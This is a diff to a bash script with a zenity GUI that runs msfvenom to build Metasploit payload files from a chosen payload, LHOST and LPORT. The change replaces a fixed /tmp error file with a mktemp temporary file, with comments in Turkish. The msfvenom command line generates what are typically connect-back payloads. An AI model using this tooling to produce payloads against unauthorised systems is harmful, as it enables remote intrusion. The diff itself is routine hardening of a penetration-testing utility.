@@ -337,11 +337,15 @@ run_zenity_mode() {
     LPORT=${LPORT:-$DEFAULT_LPORT}
     FNAME=${FNAME:-$DEFAULT_NAME}
 
+    # Hata çıktısı için güvenli geçici dosya (sabit /tmp yolu yerine)
+    local MSFERR
+    MSFERR=$(mktemp)
+
     # Progress bar simulation while running
     (
         echo "10" ; sleep 0.5
-        echo "# Generating Payload..." 
-        
+        echo "# Generating Payload..."
+
         # Ensure cleanup before generating new payload
         if [ -f "${CWD}/${FNAME}.${EXT}" ]; then
             rm -f "${CWD}/${FNAME}.${EXT}"
@@ -350,7 +354,7 @@ run_zenity_mode() {
         # We need to run the command and check result, but zenity progress reads stdout.
         # So we run it silently and report based on exit code, but capturing output is tricky in subshell pipe.
         # Simplified for GUI responsiveness:
-        if msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$EXT" -o "${CWD}/${FNAME}.${EXT}" 2>/tmp/msferr; then
+        if msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$EXT" -o "${CWD}/${FNAME}.${EXT}" 2>"$MSFERR"; then
              echo "90"
              echo "# Done!" ; sleep 1
         else
@@ -364,9 +368,10 @@ run_zenity_mode() {
         zenity --info --text="Payload Successfully Generated:\n${CWD}/${FNAME}.${EXT}"
     else
         local ERR
-        ERR=$(cat /tmp/msferr)
+        ERR=$(cat "$MSFERR")
         zenity --error --text="Payload Generation Failed.\n$ERR"
     fi
+    rm -f "$MSFERR"
 }
 
 # ----------------------------
